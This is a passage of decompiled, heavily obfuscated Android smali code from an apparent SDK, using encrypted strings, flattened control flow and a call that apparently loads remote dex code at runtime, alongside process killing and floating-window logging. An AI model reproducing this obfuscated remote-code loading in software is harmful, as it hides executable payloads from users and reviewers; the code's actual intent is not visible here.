    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "N8oXe886+4h6niQMnBOR\n"

    const-string v5, "2HabnHSyHSU=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "A/tVgeI=\n"

    const-string v5, "Zokn7pBzz18=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    goto/16 :goto_2d

    :sswitch_ce
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "nPga2LWJUYzy51+ngOPg1JraF9ixnA==\n"

    const-string v5, "fmK6Nw0GcWk=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "OgT2I/xVz2Z3XfBkr2CULnYL\n"

    const-string v5, "1bh6xEfdKcs=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "4ZUqvwg=\n"

    const-string v5, "hOdY0HoIuRA=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    sput-boolean v2, LCu7y/sdk/e5;->a:Z

    goto/16 :goto_2d

    :sswitch_cf
    const-string v2, "\u06e2\u06d6\u06e4\u06e2\u06e0\u06eb\u06ec\u06e5\u06dc\u06df\u06d8\u06e2\u06e6\u06df\u06e6\u06d8\u06ec\u06d8\u06ec\u06db\u06d9\u06e2\u06e2\u06d7\u06ec\u06d6\u06da\u06e0\u06d6\u06e2\u06e5\u06d8\u06e2\u06e6\u06e4\u06ec\u06db\u06da\u06d7\u06e0\u06dc\u06eb"

    goto/16 :goto_38

    :sswitch_d0
    const v7, -0x324fbf37

    const-string v2, "\u06e4\u06db\u06d8\u06d9\u06e0\u06e1\u06d8\u06e5\u06e4\u06e5\u06ec\u06eb\u06e5\u06d8\u06dc\u06e2\u06e5\u06e1\u06d9\u06e6\u06d8\u06eb\u06e4\u06df\u06dc\u06d9\u06dc\u06eb\u06d8\u06d8\u06d9\u06ec\u06e1\u06d8\u06e0\u06eb\u06e5\u06d8\u06db\u06e7\u06d8\u06d8\u06e5\u06d8\u06dc\u06e1\u06e4\u06e7\u06e4\u06d6\u06df\u06e7\u06da\u06ec"

    :goto_53
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_3c

    goto :goto_53

    :sswitch_d1
    const-string v2, "\u06eb\u06e6\u06d6\u06db\u06e5\u06d7\u06da\u06e1\u06dc\u06e5\u06e6\u06e5\u06d8\u06e7\u06d7\u06e7\u06db\u06e0\u06dc\u06dc\u06e4\u06e5\u06d7\u06d6\u06e7\u06db\u06e0\u06eb\u06d8\u06e4\u06d8\u06e2\u06e6\u06d6\u06d8\u06e1\u06d6\u06e4\u06e2\u06d6\u06df\u06d9\u06da\u06e0\u06e5\u06db\u06d8\u06d9\u06e8\u06ec"

    goto/16 :goto_38

    :cond_1a
    const-string v2, "\u06d6\u06da\u06e5\u06e4\u06d8\u06e6\u06d9\u06e1\u06d9\u06da\u06eb\u06d9\u06d7\u06df\u06eb\u06e4\u06e4\u06e0\u06d9\u06e2\u06da\u06e2\u06e0\u06e8\u06e2\u06eb\u06e7\u06d8\u06d8\u06d8"

    goto :goto_53

    :sswitch_d2
    if-eqz v5, :cond_1a

    const-string v2, "\u06eb\u06e0\u06d8\u06d8\u06e1\u06e5\u06e0\u06e7\u06e7\u06e6\u06d9\u06da\u06e8\u06d8\u06ec\u06e7\u06e1\u06d8\u06dc\u06e0\u06d7\u06e2\u06db\u06e2\u06e8\u06dc\u06df\u06df\u06d9\u06e6\u06d8\u06d6\u06d7\u06df\u06e5\u06e6\u06e7\u06e8\u06d9\u06e1\u06eb\u06da\u06d6\u06ec\u06e7\u06db\u06dc\u06d8\u06e8\u06db\u06e8\u06d6\u06d8\u06e8\u06e7\u06d6\u06da\u06e8\u06d8"

    goto :goto_53

    :sswitch_d3
    const-string v2, "\u06e8\u06da\u06e6\u06d8\u06da\u06df\u06dc\u06e0\u06da\u06e2\u06e6\u06ec\u06e6\u06d8\u06ec\u06e4\u06e4\u06d8\u06dc\u06eb\u06e2\u06eb\u06e2\u06e5\u06d8\u06d8\u06eb\u06d8\u06e5\u06e1\u06d9\u06db\u06eb\u06e4\u06eb\u06df\u06ec\u06d8\u06e4\u06e0\u06d8\u06da\u06e2\u06e4\u06d6\u06e7\u06d8\u06e4\u06d6\u06d8"
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_6

    goto :goto_53

    :sswitch_d4
    const-string v2, "\u06df\u06d9\u06d8\u06d8\u06da\u06e8\u06e1\u06d8\u06da\u06e2\u06e5\u06d8\u06d8\u06db\u06e8\u06df\u06da\u06e1\u06d8\u06e1\u06dc\u06eb\u06e8\u06e5\u06e6\u06d8\u06eb\u06da\u06e2\u06dc\u06e2\u06e6\u06df\u06d9\u06e1\u06da\u06ec\u06ec\u06d8\u06dc\u06d7"

    goto/16 :goto_38

    :catchall_0
    move-exception v2

    :try_start_27
    invoke-virtual {v4}, Ljava/io/Writer;->close()V
    :try_end_27
    .catchall {:try_start_27 .. :try_end_27} :catchall_1

    :goto_54
    :try_start_28
    throw v2
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_7

    :catch_7
    move-exception v2

    :try_start_29
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "e8I9yuCHMIYHnCq2lY9w7jbIRJvV5WmR\n"

    const-string v8, "knmsL3AK1Qs=\n"

    invoke-static {v7, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "2A66mqc=\n"

    const-string v7, "vXzI9dWt2lw=\n"

    invoke-static {v4, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_6

    goto/16 :goto_39

    :catchall_1
    move-exception v4

    :try_start_2a
    invoke-virtual {v2, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_7

    goto :goto_54

    :sswitch_d5
    :try_start_2b
    const-string v2, "\u06dc\u06e5\u06d8\u06e4\u06d7\u06e6\u06db\u06e5\u06e0\u06e6\u06dc\u06d8\u06d8\u06dc\u06d8\u06d8\u06e0\u06dc\u06e7\u06d7\u06df\u06eb\u06e0\u06df\u06e8\u06e8\u06e5\u06e1\u06d9\u06d8\u06e8\u06da\u06d9\u06e8\u06df\u06da\u06e2\u06d7\u06e6\u06e1\u06d6\u06ec\u06e1\u06d8\u06e7\u06e2\u06d6\u06df\u06d8\u06e8\u06d8\u06db\u06d7\u06d9\u06e6\u06da\u06df"

    goto/16 :goto_3a

    :sswitch_d6
    const v8, 0x4577e5

    const-string v2, "\u06e1\u06d7\u06e6\u06e7\u06d9\u06e7\u06eb\u06dc\u06e7\u06d8\u06da\u06e6\u06dc\u06e0\u06eb\u06db\u06eb\u06df\u06e8\u06ec\u06d9\u06e2\u06e4\u06dc\u06e6\u06d8\u06e0\u06d7\u06e1\u06d8\u06da\u06e0\u06e5\u06e7\u06e5\u06e1\u06d8\u06e0\u06e7\u06dc\u06d8\u06ec\u06d6\u06e7\u06db\u06e7\u06e6\u06d8"

    :goto_55
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_3d

    goto :goto_55

    :sswitch_d7
    const-string v2, "\u06dc\u06e0\u06e5\u06d8\u06da\u06d8\u06d7\u06e2\u06db\u06e1\u06d8\u06d7\u06e6\u06ec\u06d8\u06e7\u06e1\u06d8\u06e1\u06e7\u06da\u06d8\u06e1\u06e7\u06d8\u06eb\u06e1\u06e6\u06d8\u06ec\u06e6\u06d8\u06db\u06e6\u06e0\u06e6\u06eb\u06db\u06e6\u06d8\u06d8\u06d8\u06d8\u06e0\u06e6\u06d6\u06e1\u06eb\u06e8\u06e4\u06dc\u06df\u06e2\u06dc\u06ec\u06df\u06da"

    goto/16 :goto_3a

    :cond_1b
    const-string v2, "\u06e0\u06ec\u06dc\u06d7\u06d8\u06e7\u06d8\u06ec\u06d8\u06d8\u06d8\u06e7\u06e1\u06d7\u06df\u06e0\u06e5\u06d8\u06e6\u06df\u06ec\u06df\u06da\u06e7\u06eb\u06d9\u06e2\u06e6\u06d6\u06db\u06ec\u06e0\u06d9\u06dc\u06e7\u06e1\u06e8\u06db\u06d6\u06d8"

    goto :goto_55

    :sswitch_d8
    if-eqz v7, :cond_1b

    const-string v2, "\u06ec\u06e0\u06e5\u06d8\u06e0\u06e6\u06e7\u06d8\u06d8\u06db\u06da\u06d7\u06d9\u06e2\u06db\u06ec\u06e2\u06d6\u06d6\u06e5\u06e4\u06db\u06e5\u06d8\u06dc\u06db\u06dc\u06d8\u06e5\u06dc\u06e2\u06e2\u06d6\u06e8\u06e0\u06ec\u06e2\u06d8\u06eb\u06d8"

    goto :goto_55

    :sswitch_d9
    const-string v2, "\u06d6\u06df\u06e1\u06e4\u06e5\u06dc\u06e5\u06dc\u06eb\u06d7\u06d6\u06e6\u06e6\u06e8\u06d8\u06df\u06ec\u06e8\u06d6\u06e6\u06df\u06e2\u06df\u06e4\u06d6\u06e5\u06e1\u06d8\u06e0\u06e6\u06e4\u06e2\u06d6\u06e8\u06d8\u06e1\u06d6\u06da\u06db\u06eb\u06e7\u06d6\u06db\u06e2"
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_2b .. :try_end_2b} :catch_6

    goto :goto_55

    :sswitch_da
    const-string v2, "\u06e0\u06dc\u06e6\u06db\u06eb\u06e0\u06e8\u06e8\u06d6\u06d8\u06df\u06e6\u06e5\u06d8\u06e5\u06e8\u06e0\u06e2\u06df\u06d8\u06e5\u06eb\u06da\u06eb\u06e0\u06e8\u06df\u06e0\u06df\u06e6\u06dc\u06da\u06e8\u06dc\u06d9\u06d9"

    goto/16 :goto_3a

    :sswitch_db
    :try_start_2c
    const-string v4, "\u06df\u06e8\u06e5\u06d8\u06db\u06da\u06e5\u06d8\u06db\u06e5\u06d9\u06d8\u06df\u06d9\u06e1\u06e6\u06dc\u06d8\u06d6\u06d9\u06e4\u06e6\u06d9\u06e7\u06dc\u06d9\u06e0\u06e4\u06e8\u06d8\u06d6\u06e2\u06e2\u06d9\u06ec\u06da\u06e7\u06e7\u06d6\u06e1\u06db\u06e6\u06ec\u06e5\u06da\u06e4\u06db\u06dc\u06e7\u06da\u06ec"

    goto/16 :goto_3c

    :sswitch_dc
    const v10, 0x1fcd5d0c

    const-string v4, "\u06e0\u06d7\u06d8\u06d8\u06db\u06e1\u06e5\u06d8\u06db\u06ec\u06d8\u06db\u06db\u06dc\u06dc\u06d9\u06d6\u06d8\u06dc\u06e4\u06e6\u06e7\u06d6\u06e0\u06e8\u06e5\u06d8\u06eb\u06db\u06e7\u06df\u06eb\u06e8\u06d8\u06d9\u06e5\u06d8\u06d8\u06e4\u06e5\u06e8\u06e7\u06e1\u06e1\u06d8\u06e7\u06e5\u06e7\u06eb\u06e1\u06e4\u06d9\u06e0\u06e7\u06e7\u06dc\u06d9\u06df\u06d9\u06e5\u06d8"

    :goto_56
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_3e

    goto :goto_56

    :sswitch_dd
    const-string v4, "\u06e7\u06eb\u06e0\u06e2\u06e1\u06e4\u06d9\u06e5\u06e7\u06d6\u06da\u06e6\u06e0\u06e1\u06e0\u06d8\u06e1\u06db\u06df\u06e4\u06e1\u06e7\u06e1\u06da\u06ec\u06d6\u06dc\u06ec\u06dc\u06e8\u06d8\u06dc\u06da\u06e5\u06da\u06e4\u06e5\u06eb\u06e2\u06ec\u06e2\u06d6\u06dc\u06d8"

    goto/16 :goto_3c

    :cond_1c
    const-string v4, "\u06e2\u06d6\u06e1\u06d8\u06da\u06db\u06d9\u06dc\u06dc\u06e7\u06d8\u06d7\u06e0\u06dc\u06da\u06da\u06d9\u06d7\u06e0\u06e6\u06df\u06e4\u06e6\u06d8\u06e5\u06d8\u06e5\u06e2\u06e0\u06e5\u06df\u06e8\u06d6\u06d9\u06df\u06eb\u06e4\u06db\u06e2\u06dc\u06da\u06e8"

    goto :goto_56

    :sswitch_de
    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v2, v4, :cond_1c

    const-string v4, "\u06dc\u06d7\u06db\u06e4\u06e6\u06e8\u06d9\u06ec\u06ec\u06e5\u06d7\u06d8\u06d8\u06e8\u06db\u06ec\u06d7\u06eb\u06d6\u06e1\u06d7\u06e1\u06e0\u06dc\u06d8\u06df\u06e7\u06e2\u06dc\u06e7\u06d7"

    goto :goto_56

    :sswitch_df
    const-string v4, "\u06e0\u06ec\u06e6\u06dc\u06df\u06d7\u06ec\u06d8\u06e2\u06d8\u06db\u06e6\u06e6\u06d8\u06d8\u06e8\u06db\u06d9\u06dc\u06e0\u06e6\u06e6\u06d8\u06e1\u06e6\u06e5\u06df\u06da\u06d6\u06d8\u06d6\u06d7\u06da\u06e5\u06e2\u06d9"

    goto :goto_56

    :sswitch_e0
    const v9, -0x137e79d8

    const-string v4, "\u06eb\u06d8\u06ec\u06e2\u06d7\u06e7\u06e2\u06e7\u06e2\u06dc\u06e4\u06e6\u06e6\u06e5\u06d8\u06da\u06eb\u06d6\u06e6\u06ec\u06dc\u06d6\u06eb\u06eb\u06d9\u06d7\u06e5\u06d8\u06da\u06e2\u06e1\u06d8\u06dc\u06da\u06e7\u06e1\u06d8\u06dc\u06d8\u06e6\u06df\u06d6\u06d8\u06e1\u06e8\u06e6\u06d8"

    :goto_57
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_3f

    goto :goto_57

    :sswitch_e1
    const v10, -0x4284ef5d

    const-string v4, "\u06e5\u06eb\u06d6\u06db\u06da\u06d9\u06e6\u06e7\u06db\u06db\u06db\u06e1\u06db\u06d8\u06d6\u06d8\u06d8\u06eb\u06db\u06d8\u06e6\u06e2\u06df\u06e6\u06d6\u06d8\u06d8\u06da\u06e7\u06df\u06da\u06d8\u06eb\u06d9\u06eb\u06d8\u06d6\u06d8\u06df\u06eb\u06e2\u06e2\u06e4\u06db\u06df\u06e0\u06dc\u06d8\u06e0\u06e4\u06e8\u06d8"

    :goto_58
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_40

    goto :goto_58

    :sswitch_e2
    const-string v4, "\u06d8\u06e2\u06e5\u06e5\u06d9\u06ec\u06ec\u06e7\u06e4\u06d6\u06df\u06eb\u06df\u06e0\u06df\u06ec\u06d7\u06e4\u06e5\u06e1\u06ec\u06dc\u06e5\u06da\u06df\u06e0\u06d8\u06d8\u06e2\u06df\u06e2\u06d9\u06e7\u06d6\u06d8\u06e4\u06d9\u06e0\u06e1\u06e8\u06d7\u06df\u06d8\u06d6\u06e1\u06e8\u06e5\u06d8\u06d6\u06d6\u06d9\u06e4\u06d8\u06df\u06e6\u06eb\u06e0"

    goto :goto_57

    :cond_1d
    const-string v4, "\u06e0\u06e2\u06ec\u06eb\u06e7\u06e0\u06e1\u06da\u06eb\u06db\u06d6\u06e6\u06e2\u06d8\u06d7\u06eb\u06d8\u06e1\u06d8\u06d6\u06e5\u06d6\u06d7\u06e4\u06e5\u06e6\u06d9\u06e8\u06e1\u06df\u06e0\u06e4\u06d8\u06dc\u06eb\u06d7\u06ec\u06eb\u06da\u06dc\u06dc\u06d8\u06dc\u06d8\u06db\u06e4\u06d8\u06e0\u06e5\u06e8\u06d8\u06e7\u06e5\u06d8\u06ec\u06ec\u06da"

    goto :goto_58

    :sswitch_e3
    invoke-virtual {v5, v2}, Lorg/json/JSONArray;->optString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1d

    const-string v4, "\u06eb\u06d6\u06ec\u06eb\u06db\u06ec\u06d7\u06ec\u06e6\u06e5\u06eb\u06e1\u06d8\u06e8\u06d6\u06e6\u06d8\u06df\u06e2\u06e6\u06d8\u06ec\u06d6\u06d8\u06e8\u06e4\u06e6\u06d7\u06da\u06d7\u06e6\u06dc\u06dc\u06dc\u06ec\u06e2\u06ec\u06e1\u06da\u06d9\u06d6\u06dc\u06e1\u06db\u06df\u06dc\u06e5\u06d8\u06e6\u06e2\u06d8\u06db\u06da\u06e5\u06d8\u06d7\u06db\u06d6"

    goto :goto_58

    :sswitch_e4
    const-string v4, "\u06ec\u06e0\u06e1\u06d8\u06d6\u06dc\u06ec\u06e8\u06da\u06e4\u06eb\u06e7\u06da\u06d7\u06eb\u06e7\u06e0\u06e1\u06d8\u06db\u06e8\u06d8\u06d6\u06e2\u06df\u06d6\u06d6\u06e0\u06e8\u06d8\u06e1"

    goto :goto_58

    :sswitch_e5
    const-string v4, "\u06e5\u06e7\u06da\u06e1\u06eb\u06e2\u06db\u06d7\u06e1\u06e0\u06e0\u06e6\u06d8\u06d7\u06eb\u06d8\u06e4\u06e7\u06db\u06ec\u06d8\u06d6\u06e4\u06d8\u06e1\u06d6\u06e6\u06d8\u06e5\u06d7\u06df\u06d9\u06d8\u06e1\u06df\u06e1\u06da\u06e4\u06dc\u06d8\u06e4\u06ec\u06d7\u06e8\u06e2\u06e1\u06d8\u06e5\u06df\u06e5\u06d8"

    goto :goto_57

    :sswitch_e6
    const-string v4, "\u06db\u06d7\u06d8\u06d9\u06df\u06d9\u06d7\u06dc\u06e6\u06e5\u06e6\u06d8\u06d8\u06e4\u06df\u06e6\u06d8\u06e4\u06d9\u06d8\u06da\u06d7\u06da\u06e4\u06e6\u06e6\u06d8\u06df\u06e6\u06ec\u06e6\u06da\u06dc\u06d8\u06e4\u06e0\u06e8\u06d8\u06e5\u06d7\u06e2"

    goto :goto_57

    :sswitch_e7
    new-instance v2, LCu7y/sdk/b5;

    const/4 v4, 0x0

    move-object/from16 v0, p3

    invoke-direct {v2, v0, v7, v4}, LCu7y/sdk/b5;-><init>(Landroid/content/Context;Landroid/app/Activity;I)V

    invoke-virtual {v7, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :sswitch_e8
    invoke-static {}, Lapi/repository/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v4

    const v5, 0x39308303

    const-string v2, "\u06e7\u06db\u06e6\u06db\u06d7\u06d8\u06ec\u06eb\u06e8\u06d8\u06e2\u06e6\u06d9\u06d7\u06d8\u06d6\u06d8\u06e1\u06ec\u06e5\u06e0\u06d9\u06eb\u06e0\u06e6\u06e1\u06d8\u06ec\u06e7\u06d6\u06e0\u06e0\u06da"

    :goto_59
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_41

    goto :goto_59

    :goto_5a
    :sswitch_e9
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, LCu7y/sdk/a5;

    const/4 v5, 0x1

    invoke-direct {v4, v5}, LCu7y/sdk/a5;-><init>(I)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    invoke-static/range {p3 .. p3}, Lapi/repository/Utils;->loadRemoteDex(Landroid/content/Context;)V

    invoke-interface/range {p5 .. p5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    sget-object v4, LCu7y/sdk/e5;->e:Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p0, v5

    aget-object v5, p6, v5

    invoke-interface {v2, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    sget-object v4, LCu7y/sdk/e5;->f:Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p2, v5

    invoke-interface {v2, v4, v5}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/4 v2, 0x0

    sput-boolean v2, LCu7y/sdk/e5;->a:Z

    const v4, 0x1c8b4afa

    const-string v2, "\u06df\u06d6\u06e7\u06d8\u06dc\u06d8\u06e5\u06d8\u06d7\u06d9\u06da\u06e4\u06e7\u06e5\u06d8\u06e0\u06e1\u06d7\u06d9\u06e5\u06e0\u06d6\u06e1\u06e2\u06eb\u06e6\u06db\u06e8\u06e6\u06da\u06ec\u06e0\u06e2\u06e2\u06e0\u06d9\u06eb\u06e0\u06d6\u06d6\u06d8\u06db\u06e2\u06e6\u06dc\u06d8\u06ec\u06e5\u06d8\u06d8\u06e1\u06dc\u06e4\u06db\u06e8\u06da\u06e2\u06e8\u06eb"

    :goto_5b
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_42

    goto :goto_5b

    :sswitch_ea
    const-string v2, "\u06d6\u06d9\u06e5\u06da\u06e4\u06e4\u06e7\u06d6\u06e5\u06e5\u06db\u06eb\u06e1\u06d6\u06ec\u06e7\u06df\u06e6\u06d8\u06e1\u06df\u06e4\u06e8\u06d6\u06e1\u06d8\u06e6\u06da\u06e0\u06d8\u06df\u06d7\u06db\u06ec\u06eb\u06e4\u06d9\u06da\u06da\u06e7\u06eb\u06e5\u06ec\u06dc\u06d8"

    goto :goto_5b

    :sswitch_eb
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_3b

    :sswitch_ec
    const-string v2, "\u06eb\u06ec\u06e5\u06df\u06dc\u06e7\u06eb\u06e5\u06d8\u06d9\u06eb\u06e8\u06d8\u06e2\u06ec\u06d8\u06db\u06e7\u06e8\u06d8\u06e0\u06e7\u06e0\u06e0\u06e2\u06e2\u06e5\u06d8\u06e5\u06d8\u06da\u06e4\u06e4\u06e6\u06db\u06e6\u06d8\u06eb\u06e2\u06eb\u06e4\u06e6\u06e1\u06d8\u06eb\u06d7\u06e1\u06d8\u06e8\u06db\u06d6\u06d6\u06e1\u06df"

    goto :goto_59

    :sswitch_ed
    const v7, -0x630a2737

    const-string v2, "\u06d9\u06da\u06e8\u06d8\u06d9\u06e0\u06e0\u06eb\u06e0\u06d8\u06e2\u06dc\u06e2\u06ec\u06e8\u06dc\u06e2\u06e5\u06db\u06d9\u06eb\u06db\u06e1\u06e2\u06dc\u06ec\u06dc\u06d6\u06da\u06db\u06dc\u06e1\u06e4\u06ec\u06db\u06df\u06da\u06e5\u06e8\u06da\u06da\u06df\u06e6\u06e2\u06df\u06ec\u06e4"

    :goto_5c
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_43

    goto :goto_5c

    :sswitch_ee
    const-string v2, "\u06da\u06e1\u06eb\u06df\u06d6\u06e6\u06d8\u06e8\u06d8\u06e7\u06da\u06d6\u06dc\u06d8\u06e6\u06e4\u06df\u06e7\u06e8\u06df\u06d9\u06e8\u06e8\u06ec\u06db\u06eb\u06d7\u06db\u06e5\u06d8\u06e8\u06d8\u06d9\u06d9\u06ec\u06ec\u06e6\u06d9\u06e6"

    goto :goto_59

    :cond_1e
    const-string v2, "\u06e5\u06da\u06e2\u06e8\u06dc\u06d9\u06d8\u06e0\u06dc\u06db\u06d6\u06e5\u06e2\u06e1\u06e7\u06d8\u06e0\u06e5\u06df\u06ec\u06e1\u06e7\u06ec\u06e5\u06e8\u06d6\u06e2\u06e4\u06e8\u06dc\u06e7\u06e1\u06dc\u06e1\u06da\u06da\u06df\u06e6\u06d8\u06d8\u06d7\u06d7\u06da"

    goto :goto_5c

    :sswitch_ef
    invoke-static {v4}, Lapi/repository/Utils;->g(Landroid/app/Activity;)Z

    move-result v2

    if-eqz v2, :cond_1e

    const-string v2, "\u06df\u06e4\u06e5\u06d8\u06e6\u06d8\u06d8\u06d6\u06d7\u06dc\u06e1\u06d8\u06e7\u06d8\u06e6\u06d7\u06d7\u06db\u06d7\u06e1\u06d8\u06e2\u06d9\u06d6\u06e7\u06e5\u06d6\u06d8\u06e8\u06dc\u06e1\u06d8\u06db\u06db\u06df\u06e1\u06db\u06e0\u06e7\u06e2\u06df"

    goto :goto_5c

    :sswitch_f0
    const-string v2, "\u06e7\u06df\u06e1\u06d8\u06ec\u06e6\u06d8\u06e7\u06dc\u06e1\u06d8\u06e0\u06eb\u06e6\u06e1\u06ec\u06e0\u06d7\u06e8\u06d8\u06d6\u06e1\u06e7\u06dc\u06e5\u06d8\u06d6\u06d6\u06eb\u06e7\u06d9\u06ec\u06e5\u06da\u06e6\u06d8\u06d9\u06e5\u06e6"

    goto :goto_5c

    :sswitch_f1
    const-string v2, "\u06e0\u06df\u06e6\u06d8\u06d6\u06e2\u06e1\u06d8\u06db\u06eb\u06da\u06da\u06e4\u06d8\u06d8\u06e2\u06d8\u06dc\u06da\u06e0\u06da\u06d6\u06e7\u06d9\u06e5\u06db\u06d8\u06df\u06e8\u06df\u06e6\u06e7\u06ec\u06db\u06e7\u06d9\u06e7\u06df\u06df\u06e0\u06ec\u06da\u06e1\u06d8\u06e1\u06d8\u06e5\u06d7\u06e6\u06e7\u06e5"

    goto :goto_59

    :sswitch_f2
    new-instance v2, LCu7y/sdk/b5;

    const/4 v5, 0x1

    move-object/from16 v0, p3

    invoke-direct {v2, v4, v0, v5}, LCu7y/sdk/b5;-><init>(Landroid/app/Activity;Landroid/content/Context;I)V

    invoke-virtual {v4, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_5a

    :sswitch_f3
    const-string v2, "\u06df\u06d6\u06e5\u06d6\u06dc\u06d8\u06df\u06dc\u06d8\u06d8\u06db\u06d8\u06e1\u06e8\u06eb\u06e5\u06d8\u06e5\u06df\u06e8\u06d8\u06d8\u06dc\u06e1\u06d8\u06e1\u06d9\u06df\u06da\u06e8\u06d6\u06e2\u06e1\u06e6\u06d8"

    goto :goto_5b

    :sswitch_f4
    const v5, -0x242e91f

    const-string v2, "\u06e0\u06d9\u06e5\u06d8\u06da\u06d8\u06e5\u06d8\u06e2\u06e2\u06e6\u06d8\u06d9\u06d9\u06e7\u06da\u06da\u06d8\u06dc\u06d9\u06df\u06e5\u06e7\u06e8\u06df\u06e7\u06d6\u06e8\u06e6\u06d8\u06da\u06eb\u06ec"

    :goto_5d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_44

    goto :goto_5d

    :sswitch_f5
    const-string v2, "JCxheEBh1r8uKQ==\n"

